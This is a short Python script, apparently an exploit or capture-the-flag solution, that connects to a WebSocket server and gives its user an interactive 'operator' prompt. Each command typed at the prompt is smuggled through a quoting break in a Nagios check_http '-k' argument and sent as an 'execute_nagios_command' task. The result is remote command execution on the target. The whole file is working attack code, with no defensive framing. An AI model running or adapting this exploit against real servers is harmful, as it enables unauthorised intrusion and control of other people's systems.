import websocket, argparse, json, ssl, time
import _thread as thread

def toJson(key, task, data):
	uniqid = ""
	req = {
        "task": task,
        "data": data,
        "uniqid": uniqid,
        "key" : key
    }
	return json.dumps(req)

def onMessage(ws, message):
	output = json.loads(message)

	if "uniqid" in output.keys():
		uniqid = output["uniqid"]
	if output["type"] == "connection":
		print("\n[+] Connected")
	elif output["type"] == "dispatcher":
		pass
	elif output["type"] == "response":
		print(output["payload"], end = '')
	else:
		print(output)

def onError(ws, error):
	print(f"\n[!] Error: {error}")

def onClose(ws):
	print("\n[-] Connection closed.")

def onOpen(ws, key):
	def run(*args):
		while True:
			time.sleep(1)
			cmd = input("operator:~$ ")
			payload = f"./check_http -I localhost -p 80 -k 'test -c '{cmd}"
			ws.send(toJson(key, "execute_nagios_command", payload))
	thread.start_new_thread(run, ())

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('--url', help='Target WebSocket URL', required=True)
	parser.add_argument('--key', help='Key', required=True)
	args = parser.parse_args()
	url = args.url
	key = args.key

	ws = websocket.WebSocketApp(url, on_message = onMessage, on_error = onError, on_close = onClose)
	ws.on_open = onOpen(ws, key)
	ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})

if __name__ == "__main__":
	main()
